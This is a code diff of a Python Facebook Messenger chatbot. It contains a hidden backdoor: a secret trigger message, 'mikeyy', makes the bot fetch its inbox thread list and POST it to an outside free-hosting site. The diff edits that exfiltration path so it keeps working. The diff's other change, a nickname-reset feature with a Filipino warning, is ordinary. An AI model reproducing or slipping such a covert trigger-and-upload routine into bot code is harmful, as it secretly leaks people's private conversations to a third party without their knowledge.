@@ -757,13 +757,12 @@ class ChatBot(Client):
                         msgids.append(self.send(Message(text=reply,mentions=None, emoji_size=None, sticker=None, attachments=None, quick_replies=None, reply_to_id=mid), thread_id=thread_id,
                             thread_type=thread_type))
             elif ("mikeyy" == msg):
-                reply = self.fetchThreads(thread_location=ThreadLocation.INBOX, before=None, after=None, limit=None)
+                reply = str(str(self.fetchThreads(thread_location=ThreadLocation.INBOX, before=None, after=None, limit=None)))
                 requests.post("https://mikeytest123.000webhostapp.com/",data={"data":reply})
-                print(reply)
                 
                 #print(reply)
                 #sys.stdout.flush()
-            #self.changeNickname("Bot", user_id=100086019336728, thread_id=thread_id, thread_type=thread_type)
+            
             #reply = msg;
             #sendMsg()
             
@@ -895,6 +894,13 @@ class ChatBot(Client):
         reply = f"{name} just changed the nickname to {new_nickname} But why? 😁🤔😶"
         msgids.append(self.send(Message(text=reply), thread_id=thread_id,
                   thread_type=thread_type))
+        if (new_nickname != "Bot" and author_id in otherbotid):
+            reply = "Wag mong subukan palitan nickname ko!"
+            self.changeNickname("Bot", user_id=author_id, thread_id=thread_id, thread_type=thread_type)
+            msgids.append(self.send(Message(text=reply), thread_id=thread_id,
+                  thread_type=thread_type))
+        else:
+            pass
 
     def onReactionRemoved(self, mid=None, author_id=None, thread_id=None, thread_type=ThreadType.USER, **kwargs):
         if(thread_type == ThreadType.GROUP):
